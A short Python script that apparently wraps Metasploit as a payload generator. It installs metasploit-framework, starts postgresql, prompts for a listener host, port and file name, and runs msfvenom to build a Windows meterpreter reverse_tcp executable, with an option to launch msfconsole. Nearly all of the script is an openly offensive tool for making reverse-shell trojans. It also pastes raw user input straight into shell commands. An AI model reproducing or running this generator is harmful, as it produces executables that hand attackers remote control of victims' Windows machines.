import os, sys,time,colorama
from colorama import Fore,Style

os.system("clear")
os.system("sudo apt install metasploit-framework")
os.system("sudo /etc/init.d/postgresql start")
os.system("clear")
banner = F'''
                               .
              /=\\
             /===\ \
            /=====\' \
           /=======\'' \
          /=========\ ' '\
         /===========\''   \
        /=============\ ' '  \
       /===============\   ''  \
      /=================\' ' ' ' \
     /===================\' ' '  ' \
    /=====================\' '   ' ' \
   /=======================\  '   ' /
  /=========================\   ' /
 /===========================\'  /
/=============================\/
'''
def make_payload():
    print(banner)
    lhost = input(f"{Fore.RED}make_payload{Fore.WHITE} exploit({Fore.RED}set lhost{Fore.WHITE}) > ")
    print(f"Lhost => {lhost}")
    lport = input(f"{Fore.RED}make_payload{Fore.WHITE} exploit({Fore.RED}set lport{Fore.WHITE}) > ")
    print(f"Lport => {lport}")
    time.sleep(1.2)
    print("\n")
    name = input(f"{Fore.RED}make_payload{Fore.WHITE} exploit({Fore.RED}payload name [.exe] {Fore.WHITE}) > ")
    print(f"Name => {name}")
    time.sleep(0.8)
    print("\n")
    os.system (f"msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST={lhost} LPORT={lport} -o {name}")
    print("Done ..")
    msf = input("To open msfconsole (Y) or to exit (E)..")
    if msf == 'Y':
        os.system("clear")
        os.system("msfconsole")
    elif msf == 'E':
        exit()
make_payload()
